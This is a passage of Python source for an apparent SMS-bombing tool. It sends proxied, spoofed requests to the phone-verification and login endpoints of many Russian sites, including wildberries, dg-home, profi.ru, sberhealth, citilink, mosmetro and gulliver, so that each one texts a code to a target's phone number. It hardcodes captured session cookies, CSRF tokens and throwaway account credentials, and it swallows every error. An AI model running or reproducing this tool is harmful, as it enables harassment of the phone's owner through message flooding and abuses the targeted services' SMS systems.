                            'phoneInput.FullPhoneMobile': number,
                            'returnUrl': 'https%3A%2F%2Fwww.wildberries.ru%2F',
                            'phonemobile': number,
                            'agreeToReceiveSms': False,
                            'shortSession': True,
                            'period': 'ru'
                        }

                        requests.post('https://www.wildberries.ru/webapi/mobile/requestconfirmcode?forAction=EasyLogin',
                                      data=payload, headers=header, proxies=proxies)
                    except:
                        pass
                    try:
                        num = number
                        num2 = ""
                        num2 += '+'
                        num2 += '7'
                        num2 += ' '
                        num2 += '('
                        num2 += num[1]
                        num2 += num[2]
                        num2 += num[3]
                        num2 += ')'
                        num2 += ' '
                        num2 += num[4]
                        num2 += num[5]
                        num2 += num[6]
                        num2 += '-'
                        num2 += num[7]
                        num2 += num[8]
                        num2 += '-'
                        num2 += num[9]
                        num2 += num[10]

                        header = {
                            'accept': '*/*',
                            'accept-encoding': 'gzip, deflate, br',
                            'accept-language': 'en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7',
                            'content-length': '89',
                            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                            'cookie': 'PHPSESSID=fcGBRpJ9fFgRpjqEW1uOzRbY69HAzlZU; DG_HOME_SALE_UID=272493274; DG_HOME_GEO_DATA_NEW=%7B%22IP%22%3A%22178.170.198.53%22%2C%22CITY%22%3A%22%5Cu0421%5Cu0430%5Cu043d%5Cu043a%5Cu0442-%5Cu041f%5Cu0435%5Cu0442%5Cu0435%5Cu0440%5Cu0431%5Cu0443%5Cu0440%5Cu0433%22%2C%22REGION%22%3A%22%5Cu0421%5Cu0430%5Cu043d%5Cu043a%5Cu0442-%5Cu041f%5Cu0435%5Cu0442%5Cu0435%5Cu0440%5Cu0431%5Cu0443%5Cu0440%5Cu0433%22%2C%22COUNTRY%22%3A%22%5Cu0420%5Cu043e%5Cu0441%5Cu0441%5Cu0438%5Cu044f%22%2C%22CODE%22%3A%220000103664%22%2C%22COORDS%22%3A%7B%22x%22%3A59.93863%2C%22y%22%3A30.31413%7D%7D; i-like-data=%5B%5D; i-like-id=763293360214388693; i-like-key=783324292312045817; BITRIX_CONVERSION_CONTEXT_s1=%7B%22ID%22%3A1%2C%22EXPIRE%22%3A1657313940%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D; _ym_uid=1657243987980650064; _ym_d=1657243987; __cfruid=bae882ca93555f37ca576a50036267298c43f129-1657243985; DG_HOME_dgpid=eyJ2YWx1ZSI6IjkwMTMzNzkxIiwicHVibGljS2V5IjoiZG1PbVI0SXZtdHVxQ0E2TyIsInNpZ24iOiJlNzQ5YmFhYzJjZTZmMjc2OWE5ZDViOGViMTY5MTE2NyJ9; _ym_isad=1; rees46_session_code=qifpGgk9gR; rees46_session_last_act=1657243986638; rees46_device_id=0pLtShobpo; rees46_lazy_recommenders=true; __cf_bm=XTgjYExcUbLGc4_6JVRao59eBAqX01Q7kTcRUIOTLeo-1657243985-0-AXrCnD8U8vjXkcPudtQIZWwLAaP4lerWmU44djH/49OsQleScJDoLsVipoPQyTB3YF84lqp3WBTqkLmxZPwFZh2KGn4ZqHc5f4rKF9py9xoZqIdxz82KMx3dkXXF25WFRw==',
                            'dnt': '1',
                            'origin': 'https://dg-home.ru',
                            'referer': 'https://dg-home.ru/',
                            'sec-ch-ua': '"Chromium";v="102", "Opera GX";v="88", ";Not A Brand";v="99"',
                            'sec-ch-ua-mobile': '?0',
                            'sec-ch-ua-platform': '"Windows"',
                            'sec-fetch-dest': 'empty',
                            'sec-fetch-mode': 'cors',
                            'sec-fetch-site': 'same-origin',
                            'user-agent': user,
                            'x-bitrix-csrf-token': '31f28c262375f7778780adcd4c1d18ca',
                            'x-requested-with': 'XMLHttpRequest'
                        }

                        payload = {
                            'sessid': '31f28c262375f7778780adcd4c1d18ca',
                            'TYPE': 'auth',
                            'PHONE': num2,
                            'auth_agree': '1'
                        }

                        r = requests.post('https://dg-home.ru/login/', data=payload, headers=header, proxies=proxies)

                        a0 = str(r.text)
                        part1, part2 = a0.split('bxs: ')
                        a1 = part2
                        part3, part4 = a1.split('xs: ')

                        res1 = ''
                        res2 = ''
                        cnt = 0

                        for i in range(len(part2)):
                            if part2[i] == "'":
                                cnt += 1
                            if cnt < 2:
                                res1 += part2[i]
                            if cnt >= 2:
                                break

                        res1 = res1[1:]
                        cnt = 0

                        for i in range(len(part4)):
                            if part4[i] == "'":
                                cnt += 1
                            if cnt < 2:
                                res2 += part4[i]
                            if cnt >= 2:
                                break

                        res2 = res2[1:]

                        header = {
                            'accept': '*/*',
                            'accept-encoding': 'gzip, deflate, br',
                            'accept-language': 'en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7',
                            'content-length': '100',
                            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                            'cookie': 'PHPSESSID=fcGBRpJ9fFgRpjqEW1uOzRbY69HAzlZU; DG_HOME_SALE_UID=272493274; DG_HOME_GEO_DATA_NEW=%7B%22IP%22%3A%22178.170.198.53%22%2C%22CITY%22%3A%22%5Cu0421%5Cu0430%5Cu043d%5Cu043a%5Cu0442-%5Cu041f%5Cu0435%5Cu0442%5Cu0435%5Cu0440%5Cu0431%5Cu0443%5Cu0440%5Cu0433%22%2C%22REGION%22%3A%22%5Cu0421%5Cu0430%5Cu043d%5Cu043a%5Cu0442-%5Cu041f%5Cu0435%5Cu0442%5Cu0435%5Cu0440%5Cu0431%5Cu0443%5Cu0440%5Cu0433%22%2C%22COUNTRY%22%3A%22%5Cu0420%5Cu043e%5Cu0441%5Cu0441%5Cu0438%5Cu044f%22%2C%22CODE%22%3A%220000103664%22%2C%22COORDS%22%3A%7B%22x%22%3A59.93863%2C%22y%22%3A30.31413%7D%7D; i-like-data=%5B%5D; i-like-id=763293360214388693; i-like-key=783324292312045817; BITRIX_CONVERSION_CONTEXT_s1=%7B%22ID%22%3A1%2C%22EXPIRE%22%3A1657313940%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D; _ym_uid=1657243987980650064; _ym_d=1657243987; __cfruid=bae882ca93555f37ca576a50036267298c43f129-1657243985; DG_HOME_dgpid=eyJ2YWx1ZSI6IjkwMTMzNzkxIiwicHVibGljS2V5IjoiZG1PbVI0SXZtdHVxQ0E2TyIsInNpZ24iOiJlNzQ5YmFhYzJjZTZmMjc2OWE5ZDViOGViMTY5MTE2NyJ9; _ym_isad=1; rees46_session_code=qifpGgk9gR; rees46_session_last_act=1657243986638; rees46_device_id=0pLtShobpo; rees46_lazy_recommenders=true; __cf_bm=XTgjYExcUbLGc4_6JVRao59eBAqX01Q7kTcRUIOTLeo-1657243985-0-AXrCnD8U8vjXkcPudtQIZWwLAaP4lerWmU44djH/49OsQleScJDoLsVipoPQyTB3YF84lqp3WBTqkLmxZPwFZh2KGn4ZqHc5f4rKF9py9xoZqIdxz82KMx3dkXXF25WFRw==',
                            'dnt': '1',
                            'origin': 'https://dg-home.ru',
                            'referer': 'https://dg-home.ru/',
                            'sec-ch-ua': '"Chromium";v="102", "Opera GX";v="88", ";Not A Brand";v="99"',
                            'sec-ch-ua-mobile': '?0',
                            'sec-ch-ua-platform': '"Windows"',
                            'sec-fetch-dest': 'empty',
                            'sec-fetch-mode': 'cors',
                            'sec-fetch-site': 'same-origin',
                            'user-agent': user,
                            'x-bitrix-csrf-token': '31f28c262375f7778780adcd4c1d18ca',
                            'x-requested-with': 'XMLHttpRequest'
                        }

                        payload = {
                            'action': 'confirm_auth',
                            'site': 's1',
                            'bxs': res1,
                            'xs': res2
                        }

                        requests.post(
                            'https://dg-home.ru/local/components/dghome-new/sms.confirm/templates/.default/ajax.php',
                            data=payload, headers=header, proxies=proxies)
                    except:
                        pass
                    try:
                        num = number
                        num2 = ""
                        num2 += '7'
                        num2 += ' '
                        num2 += '('
                        num2 += num[1]
                        num2 += num[2]
                        num2 += num[3]
                        num2 += ')'
                        num2 += ' '
                        num2 += num[4]
                        num2 += num[5]
                        num2 += num[6]
                        num2 += ' '
                        num2 += num[7]
                        num2 += num[8]
                        num2 += ' '
                        num2 += num[9]
                        num2 += num[10]

                        header = {
                            'accept': '*/*',
                            'accept-encoding': 'gzip, deflate, br',
                            'accept-language': 'en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7',
                            'content-length': '63',
                            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                            'cookie': 'PHPSESSID=l5aBRN7PGJgASxApu4Xlw5gDPQW9rpXq; BITRIX_OR_cookieLocationNew=a%3A5%3A%7Bs%3A8%3A%22LOCATION%22%3Bs%3A10%3A%220000103664%22%3Bs%3A4%3A%22CITY%22%3Bs%3A29%3A%22%D0%A1%D0%B0%D0%BD%D0%BA%D1%82-%D0%9F%D0%B5%D1%82%D0%B5%D1%80%D0%B1%D1%83%D1%80%D0%B3%22%3Bs%3A11%3A%22REGION_NAME%22%3Bs%3A41%3A%22%D0%9B%D0%B5%D0%BD%D0%B8%D0%BD%D0%B3%D1%80%D0%B0%D0%B4%D1%81%D0%BA%D0%B0%D1%8F%20%D0%BE%D0%B1%D0%BB%D0%B0%D1%81%D1%82%D1%8C%22%3Bs%3A10%3A%22PRICE_TYPE%22%3Ba%3A2%3A%7Bs%3A4%3A%22CODE%22%3Bs%3A52%3A%22%D0%A4%D0%B8%D1%80%D0%BC%D0%B5%D0%BD%D0%BD%D0%B0%D1%8F%20%D1%80%D0%BE%D0%B7%D0%BD%D0%B8%D1%86%D0%B0%20%D0%B0%D0%BA%D1%86%D0%B8%D0%BE%D0%BD%D0%BD%D0%B0%D1%8F%22%3Bs%3A2%3A%22ID%22%3Bi%3A10%3B%7Ds%3A12%3A%22FEDERAL_NAME%22%3BN%3B%7D; PAID_SOURCE_LABEL=na; BITRIX_CONVERSION_CONTEXT_s1=%7B%22ID%22%3A20%2C%22EXPIRE%22%3A1657227540%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D; _ym_uid=1657153918121826480; _ym_d=1657153918; _ym_visorc=w; _ym_isad=1; G_ENABLED_IDPS=google',
                            'dnt': '1',
                            'origin': 'https://orby.ru',
                            'referer': 'https://orby.ru/',
                            'sec-ch-ua': '"Chromium";v="102", "Opera GX";v="88", ";Not A Brand";v="99"',
                            'sec-ch-ua-mobile': '?0',
                            'sec-ch-ua-platform': '"Windows"',
                            'sec-fetch-dest': 'empty',
                            'sec-fetch-mode': 'cors',
                            'sec-fetch-site': 'same-origin',
                            'user-agent': user,
                            'x-requested-with': 'XMLHttpRequest'
                        }

                        payload = {
                            'phone': num2,
                            'sessid': '408d7573119828883c19f6d2e908684b'
                        }

                        requests.post('https://orby.ru/local/ajax/auth/phone.php', data=payload, headers=header,
                                      proxies=proxies)
                    except:
                        pass
                    try:
                        num = number
                        num2 = ""
                        num2 += '7'
                        num2 += ' '
                        num2 += num[1]
                        num2 += num[2]
                        num2 += num[3]
                        num2 += '-'
                        num2 += num[4]
                        num2 += num[5]
                        num2 += num[6]
                        num2 += '-'
                        num2 += num[7]
                        num2 += num[8]
                        num2 += '-'
                        num2 += num[9]
                        num2 += num[10]

                        header = {
                            'accept': 'application/json',
                            'accept-encoding': 'gzip, deflate, br',
                            'accept-language': 'en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7',
                            'content-length': '2160',
                            'content-type': 'application/json',
                            'cookie': 'city=msk; site_version=desktop; first_hit_url=/; uid=45BBBAB97429C6623430FDB70235D554; sid=ubq7RWLGKXS3/TA0VNU1Ag==; geo_city_confirmed=yes; _ym_uid=1657153910485756991; _ym_d=1657153910; _ym_isad=1; prfr_tkn=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiZnVsbCIsInZlcnNpb24iOjEsImlkIjoiYzBkYzViOTItMjNmZi00ZjdlLWFjYjItYzIxMjczNzIxMTY1Iiwic3RhdHVzIjoidG91Y2hlZCIsInNlc3Npb25JZCI6ImJhN2FhZmNhLTlmMTMtNDRlYS1iODBjLTUxZGYyMzM5YjJmZCIsImlhdCI6MTY1NzE1NTI0NiwiZXhwIjoxNjU3MTU1ODQ2LCJqdGkiOiJjMGRjNWI5Mi0yM2ZmLTRmN2UtYWNiMi1jMjEyNzM3MjExNjUifQ.Zg6nZq5eLbWaE66p0mAdVdCZkCInjxz7XsYAbThyXlo; wtfId=3951490-1657155247.064-178.170.198.53-2769; ets=%2F_next%2Fdata%2Fprod-5c89200b5d%2Fmsk%2Fcabinet%2Flogin.json%2Chttps%3A%2F%2Fprofi.ru%2F%2C1657155247',
                            'dnt': '1',
                            'origin': 'https://profi.ru',
                            'referer': 'https://profi.ru/cabinet/login/',
                            'sec-ch-ua': '"Chromium";v="102", "Opera GX";v="88", ";Not A Brand";v="99"',
                            'sec-ch-ua-mobile': '?0',
                            'sec-ch-ua-platform': '"Windows"',
                            'sec-fetch-dest': 'empty',
                            'sec-fetch-mode': 'cors',
                            'sec-fetch-site': 'same-origin',
                            'user-agent': user,
                            'x-app-id': 'PROFI',
                            'x-new-auth-compatible': '1',
                            'x-requested-with': 'XMLHttpRequest',
                            'x-wtf-id': '3944500-1657153908.650-178.170.198.53-2018'
                        }

                        payload = {
                            "query": "#prfrtkn:front:674c8b3850056b43f431415d44590346396ce839:30d6b358b6ad046bcc5c510e2159ee8fcfb2c5b9\nquery authStrategyStart($type: AuthStrategyType!, $initialState: AuthStrategyInitialState!) {\n  authStrategyStart(type: $type, initialState: $initialState) {\n    ...AuthStrategyUseResultFragment\n  }\n}\n    fragment AuthStrategyUseResultFragment on AuthStrategyUseResult {\n  strategy {\n    strategyDescriptor\n    stepDescriptor\n    name\n    type\n  }\n  result {\n    __typename\n    ... on AuthStrategyResultRetry {\n      answer {\n        __typename\n        errors {\n          __typename\n          code\n          message\n          param\n        }\n      }\n    }\n    ... on AuthStrategyResultError {\n      answer {\n        __typename\n        errors {\n          __typename\n          code\n          message\n          param\n        }\n      }\n    }\n    ... on AuthStrategyResultSuccess {\n      __typename\n      answer {\n        __typename\n        events {\n          __typename\n          ... on AuthStrategyIAnalyticEvent {\n            type\n          }\n        }\n      }\n      auth {\n        loginUrl\n      }\n      step {\n        __typename\n        stepId\n        title\n        ... on AuthStrategyStepFillPhone {\n          phoneSuggestion\n        }\n        ... on AuthStrategyStepValidateMobileId {\n          phoneNumber\n          resendDelay\n        }\n        ... on AuthStrategyStepValidatePincode {\n          phoneNumber\n          resendDelay\n        }\n        ... on AuthStrategyStepFillUserInfo {\n          requestedFields {\n            __typename\n            fieldId\n            type\n            required\n            suggestedValue\n          }\n        }\n        ... on AuthStrategyStepRequestSocNet {\n          socNetId\n          oAuthStateToken\n          popupUrl\n          windowWidth\n          windowHeight\n        }\n        ... on AuthStrategyStepRequestYandex {\n          appId\n          scopes\n        }\n      }\n    }\n  }\n}",
                            "variables": {"type": "phone",
                                          "initialState": {"phoneNumber": num2, "defaultOrderCityId": "prfr",
                                                           "currentHost": "https://profi.ru"}}}

                        requests.post('https://profi.ru/graphql', json=payload, headers=header, proxies=proxies)
                    except:
                        pass
                    try:
                        header = {
                            'Host': 'pass.fc-zenit.ru',
                            'Connection': 'keep-alive',
                            'Content-Length': '65',
                            'Cache-Control': 'max-age=0',
                            'sec-ch-ua': '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
                            'sec-ch-ua-mobile': '?0',
                            'sec-ch-ua-platform': '"Windows"',
                            'Upgrade-Insecure-Requests': '1',
                            'Origin': 'https://pass.fc-zenit.ru',
                            'Content-Type': 'application/x-www-form-urlencoded',
                            'User-Agent': user,
                            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                            'Sec-Fetch-Site': 'same-origin',
                            'Sec-Fetch-Mode': 'navigate',
                            'Sec-Fetch-User': '?1',
                            'Sec-Fetch-Dest': 'document',
                            'Referer': 'https://pass.fc-zenit.ru/auth/register',
                            'Accept-Encoding': 'gzip, deflate, br',
                            'Accept-Language': 'en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7',
                            'Cookie': 'RMID=62c62feb037367.43238894; _ym_d=1657155564; XSRF-TOKEN=eyJpdiI6IkZadEhETUtDMERsZ29NZmdFcCsxRnc9PSIsInZhbHVlIjoiNW9PcWZSRk5QUnRwdmt5M25Tdkt4Vml1a0loVnNFWHM0RXM5aFB3U0FXazlWaGFnUWZmVHNlY0FYdC9mTndXVVR5REg1YlNmMnp5UW1ydUhhU05TcXc4TW5NNXN4WHlpUHJjQVl4ZjRIUGZURDVyZy9wdjhhZHJLdis4UlU1VVciLCJtYWMiOiI1Y2UyOTA0ZDIyZTc3OTQzM2UyMWFmMjYyNzg5YTAwZGE2NzUzZDgwYzZhMzJkYzEzY2FiNjU1OTNiOWVhZjJmIiwidGFnIjoiIn0%3D; passfc_zenitru_session=eyJpdiI6IndRM0w2R2FHQzByZnNHM1pyOU5KaFE9PSIsInZhbHVlIjoibkRvUlFOQ1NTcUVhTy9mK0JXTWQrdERYZmtranRTQ0g2Q3lOQWd2SzZJdE92MXFnSkVzRDYyMkpqV0dhclhFblZlTy9IeEU2OWhoZkx6enk2Qzd0Mktoc2M3VXQ1MTFmdUpoM1VkaGFMNG5wVnNtZTlRUWJDUkhKQk8xQyt0OW0iLCJtYWMiOiJmMmU0MTUzZWE4ZDAzMzMzNjJiM2ZmZjA3Y2Q0MGM1MjhjNDBkOTVhZDNlZDI2MTk1NTI0OTVjYjRkZDQ5ZTU1IiwidGFnIjoiIn0%3D'
                        }

                        payload = f'_token=vOCCvAramaboUHNyT5mqZwHb51BhQX0AmDXDyOCE&phone={number}'
                        requests.post('https://pass.fc-zenit.ru/auth/register/phone', data=payload, headers=header,
                                      proxies=proxies)
                    except:
                        pass
                    try:
                        header = {
                            'accept': '*/*',
                            'accept-encoding': 'gzip, deflate, br',
                            'accept-language': 'en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7',
                            'content-length': '164',
                            'content-type': 'application/json; charset=UTF-8',
                            'cookie': 'route=1657153864.612.1118.226509|4d33fc6b928f7f8ef63e5c30cfa97296; WELCOMESESSID=mapee0c248ue8c4tfuoj1rfj8f; _user_location=3eaf80b99b78f648b2ef3159af22d67d1551ea0424141f70965891ede650e8e3a%3A2%3A%7Bi%3A0%3Bs%3A14%3A%22_user_location%22%3Bi%3A1%3Bs%3A1%3A%221%22%3B%7D; utm=dfa68bfddf725256f8f84bc7fa628dd7656cc2fce1a6d522d4e73426f4b1ec02a%3A2%3A%7Bi%3A0%3Bs%3A3%3A%22utm%22%3Bi%3A1%3Bs%3A104%3A%22%7B%22utm_source%22%3A%22Organic%22%2C%22utm_medium%22%3Anull%2C%22utm_campaign%22%3A%22yandex.ru%22%2C%22utm_term%22%3Anull%2C%22utm_content%22%3Anull%7D%22%3B%7D; JivoSiteLoaded=1',
                            'dnt': '1',
                            'origin': 'https://abc.ru',
                            'referer': 'https://abc.ru/registration/',
                            'sec-ch-ua': '"Chromium";v="102", "Opera GX";v="88", ";Not A Brand";v="99"',
                            'sec-ch-ua-mobile': '?0',
                            'sec-ch-ua-platform': '"Windows"',
                            'sec-fetch-dest': 'empty',
                            'sec-fetch-mode': 'cors',
                            'sec-fetch-site': 'same-origin',
                            'user-agent': user
                        }

                        payload = {"phone": "+" + number, "country_id": '1', "scenario": "registration",
                                   "_csrf": "MtRE_k1-uTzyO2JEmGI7BBW1G4Iz3ru4Gm2Da3SrIxxloSWtHCryDYJLDnThKWFnTYF9s3i6_tdiGPAgPNhTRg=="}
                        requests.post('https://abc.ru/clientapi/v1/user/phone-sms/', json=payload, headers=header,
                                      proxies=proxies)
                    except:
                        pass
                    try:
                        header = {
                            'accept': '*/*',
                            'accept-encoding': 'gzip, deflate, br',
                            'accept-language': 'en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7',
                            'content-length': '73',
                            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                            'cookie': 'I_BITRIX2_SM_SALE_UID=c508b622908b326d9c1a5915d00cf30e; _ga=GA1.2.342945668.1657153859; _gid=GA1.2.760601932.1657153859; _ym_uid=1657153859366054950; _ym_d=1657153859; _ym_isad=1; PHPSESSID=7VyERBH7eNBFVpqLE3jo1fqLIiP6gS3M; I_BITRIX2_SM_BSPopUpBnr=%7B%2296255%22%3A1657243058%7D; I_BITRIX2_SM_BSCatalogSection=24; _ym_visorc=w; _gat=1',
                            'dnt': '1',
                            'origin': 'https://m.citystarwear.com',
                            'referer': 'https://m.citystarwear.com/lk/profile/',
                            'sec-ch-ua': '"Chromium";v="102", "Opera GX";v="88", ";Not A Brand";v="99"',
                            'sec-ch-ua-mobile': '?0',
                            'sec-ch-ua-platform': '"Windows"',
                            'sec-fetch-dest': 'empty',
                            'sec-fetch-mode': 'cors',
                            'sec-fetch-site': 'same-origin',
                            'user-agent': user,
                            'x-requested-with': 'XMLHttpRequest'
                        }

                        payload = {
                            'hdlr': 'bsAuthSendCode',
                            'key': 'DOvBhIasDOvBhISEoVINS',
                            'phone': number[1:],
                            'pcode': '+' + number[:1]
                        }
                        requests.post(
                            'https://m.citystarwear.com/bitrix/templates/bs-base/php/includes/bs-handlers.php',
                            data=payload, headers=header, proxies=proxies)
                    except:
                        pass
                    try:
                        header = {
                            'accept': 'application/json, text/plain, */*',
                            'accept-encoding': 'gzip, deflate, br',
                            'accept-language': 'en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7',
                            'captcha': 'dD0xNjU3MTYwNDQ5O2k9MTc4LjE3MC4xOTguNTM7RD0xRThBQTdEMDJEQUQwMkI5ODMzN0Y0RThFMTk4MzRCMDI3NkFBMzMyMjUwOTM3RTZGMzY5OTlFNjQ3MzFCNkM2NEQ5MUVBRjI7dT0xNjU3MTYwNDQ5OTg5NjM1MDA3O2g9NzgxMTJkNDRhZWY0MmJlNTYxNzA2M2IwZmZhY2JhMjk=',
                            'content-length': '23',
                            'content-type': 'application/json;charset=UTF-8',
                            'cookie': 'ddmp-shop=rahvgbj8i0t9pqqul1hubojebs; _csrf-ddmp-shop=tEXIbMghHCJ3zSbg7egtXwTzxRud1xCo; qrator_msid=1657160061.085.gjhgPGJijpNDZqFb-ote6oh4fbst0tv4nimikq06a3d4oo42h',
                            'dnt': '1',
                            'origin': 'https://lk.sberhealth.ru',
                            'referer': 'https://lk.sberhealth.ru/login-v2?redirectUrl=/telemed',
                            'sec-ch-ua': '"Chromium";v="102", "Opera GX";v="88", ";Not A Brand";v="99"',
                            'sec-ch-ua-mobile': '?0',
                            'sec-ch-ua-platform': '"Windows"',
                            'sec-fetch-dest': 'empty',
                            'sec-fetch-mode': 'cors',
                            'sec-fetch-site': 'same-origin',
                            'user-agent': user
                        }

                        payload = {
                            'phone': number
                        }

                        requests.post('https://lk.sberhealth.ru/api/gateway/web/rest/v1/auth/sms/initiate',
                                      json=payload,
                                      headers=header, proxies=proxies)
                    except:
                        pass
                    try:
                        num = number
                        num2 = ""
                        num2 += "+"
                        num2 += '7'
                        num2 += ' '
                        num2 += '('
                        num2 += num[1]
                        num2 += num[2]
                        num2 += num[3]
                        num2 += ')'
                        num2 += ' '
                        num2 += num[4]
                        num2 += num[5]
                        num2 += num[6]
                        num2 += ' '
                        num2 += num[7]
                        num2 += num[8]
                        num2 += ' '
                        num2 += num[9]
                        num2 += num[10]

                        header = {
                            'accept': 'application/json',
                            'accept-encoding': 'gzip, deflate, br',
                            'accept-language': 'en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7',
                            'content-length': '102',
                            'content-type': 'application/json',
                            'cookie': 'PHPSESSID=XUm3mOpwgcVf7ygU2fEFbXS2csWHKJ5M; qrator_ssid=1657160038.320.81fBg40VOkUX61L3-nfs2v7id4msq7tg286m0fejao6a3gapf; _ym_uid=165716004180966042; _ym_d=1657160041; _ym_isad=1; qrator_jsr=1657160605.476.5mmDyCBwlDavmV5d-rtkeeperf9il4h8keoanr7qf0ja9s679-00; qrator_jsid=1657160605.476.5mmDyCBwlDavmV5d-sjvtt0g7m0dcgd5gmbi382f8ug6ud0lq; CUPIS-SESSION-ID=2a98fbbf-c12f-42c2-9b25-d7e9be7bfef9',
                            'dnt': '1',
                            'origin': 'https://wallet.1cupis.ru',
                            'referer': 'https://wallet.1cupis.ru/signup?utm_referrer=https%3A%2F%2F1cupis.ru%2F',
                            'sec-ch-ua': '"Chromium";v="102", "Opera GX";v="88", ";Not A Brand";v="99"',
                            'sec-ch-ua-mobile': '?0',
                            'sec-ch-ua-platform': '"Windows"',
                            'sec-fetch-dest': 'empty',
                            'sec-fetch-mode': 'cors',
                            'sec-fetch-site': 'same-origin',
                            'user-agent': user,
                            'x-csrf-token': 'db6a7fbe-8e9f-4e5a-9c3a-86f98952249d'
                        }

                        payload = {
                            'confirm': 'on',
                            'email': 'ijp2423gj@hotmail.com',
                            'password': 'rfdDDle123',
                            'phone': num2
                        }

                        requests.post('https://wallet.1cupis.ru/doSendSms', json=payload, headers=header,
                                      proxies=proxies)
                    except:
                        pass
                    try:
                        header = {
                            'accept': '*/*',
                            'accept-encoding': 'gzip, deflate, br',
                            'accept-language': 'en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7',
                            'content-length': '0',
                            'cookie': 'old_design=0; is_show_welcome_mechanics=1; _tuid=c6448b0a001e3090da7e86e5ae7b4bd2f27e523c; _space=spb_cl%3A; ab_test=90x10v4%3A1%7Creindexer%3A2%7Cnew_designv10%3A2%7Cnew_designv13%3A1%7Cproduct_card_design%3A3%7Cdynamic_yield%3A2%7Cwelcome_mechanics%3A4%7Cdummy%3A20; ab_test_analytics=90x10v4%3A1%7Creindexer%3A2%7Cnew_designv10%3A2%7Cnew_designv13%3A1%7Cproduct_card_design%3A3%7Cdynamic_yield%3A2%7Cwelcome_mechanics%3A4%7Cdummy%3A20; _dy_ses_load_seq=84052%3A1657161316441; _dy_csc_ses=t; _dy_c_exps=; _dy_soct=1017570.1030352.1657161316*1033770.1068198.1657161316*1036008.1075335.1657161316*1046273.1214460.1657161316*1008131.1012968.1657161316*1015299.1026208.1657161316',
                            'dnt': '1',
                            'origin': 'https://www.citilink.ru',
                            'referer': 'https://www.citilink.ru/',
                            'sec-ch-ua': '"Chromium";v="102", "Opera GX";v="88", ";Not A Brand";v="99"',
                            'sec-ch-ua-mobile': '?0',
                            'sec-ch-ua-platform': '"Windows"',
                            'sec-fetch-dest': 'empty',
                            'sec-fetch-mode': 'cors',
                            'sec-fetch-site': 'same-origin',
                            'user-agent': user,
                            'x-requested-with': 'XMLHttpRequest'
                        }

                        requests.post(f'https://www.citilink.ru/registration/confirm/phone/+{number}/', headers=header,
                                      proxies=proxies)
                    except:
                        pass
                    try:
                        header = {
                            'accept': 'application/json, text/plain, */*',
                            'accept-encoding': 'gzip, deflate, br',
                            'accept-language': 'en',
                            'content-length': '89',
                            'content-type': 'application/json',
                            'dnt': '1',
                            'origin': 'https://lk.mosmetro.ru',
                            'referer': 'https://lk.mosmetro.ru/sign-up/phone-info',
                            'sec-ch-ua': '"Chromium";v="102", "Opera GX";v="88", ";Not A Brand";v="99"',
                            'sec-ch-ua-mobile': '?0',
                            'sec-ch-ua-platform': '"Windows"',
                            'sec-fetch-dest': 'empty',
                            'sec-fetch-mode': 'cors',
                            'sec-fetch-site': 'same-origin',
                            'user-agent': user
                        }

                        payload = {
                            "sessionId": "81395913-4b99-4f62-b137-bef62640ba10",
                            "login": number,
                            "type": "phone"
                        }

                        requests.post('https://lk.mosmetro.ru/api/registrations/v1.0/verify', json=payload,
                                      headers=header,
                                      proxies=proxies)
                    except:
                        pass
                    try:
                        num = number
                        num2 = ""
                        num2 += '+'
                        num2 += '7'
                        num2 += ' '
                        num2 += '('
                        num2 += num[1]
                        num2 += num[2]
                        num2 += num[3]
                        num2 += ')'
                        num2 += ' '
                        num2 += num[4]
                        num2 += num[5]
                        num2 += num[6]
                        num2 += '-'
                        num2 += num[7]
                        num2 += num[8]
                        num2 += '-'
                        num2 += num[9]
                        num2 += num[10]

                        header = {
                            'Accept': 'application/json, text/plain, */*',
                            'Accept-Encoding': 'gzip, deflate, br',
                            'Accept-Language': 'en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7',
                            'Connection': 'keep-alive',
                            'Content-Length': '0',
                            'Cookie': 'gulliver_session=rl0F3dYqXjgiIfKrJVFUZZV8Tga7h0vxd4NwjVRq; _userGUID=0:l5aam2lk:Olq2I2kL70ctHeRmWMm6akBBYytSndMb; mgo_uid=34VopnFJFDkVDmmqZKsa',
                            'DNT': '1',
                            'Host': 'www.gulliver.ru',
                            'Origin': 'https://www.gulliver.ru',
                            'Referer': 'https://www.gulliver.ru/',
                            'sec-ch-ua': '"Chromium";v="102", "Opera GX";v="88", ";Not A Brand";v="99"',
                            'sec-ch-ua-mobile': '?0',
                            'sec-ch-ua-platform': '"Windows"',
                            'Sec-Fetch-Dest': 'empty',
                            'Sec-Fetch-Mode': 'cors',
                            'Sec-Fetch-Site': 'same-origin',
                            'User-Agent': user
                        }

                        r = requests.post('https://www.gulliver.ru/api/authorization/phone/token', headers=header,
                                          proxies=proxies)
                        token0 = json.loads(r.text)
                        token = token0['data']['token']

                        header = {
                            'Accept': 'application/json, text/plain, */*',
                            'Accept-Encoding': 'gzip, deflate, br',
                            'Accept-Language': 'en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7',
                            'Connection': 'keep-alive',
                            'Content-Length': '521',
                            'Content-Type': 'application/json;charset=UTF-8',
                            'Cookie': 'gulliver_session=rl0F3dYqXjgiIfKrJVFUZZV8Tga7h0vxd4NwjVRq; _userGUID=0:l5aam2lk:Olq2I2kL70ctHeRmWMm6akBBYytSndMb; mgo_uid=34VopnFJFDkVDmmqZKsa',
                            'DNT': '1',
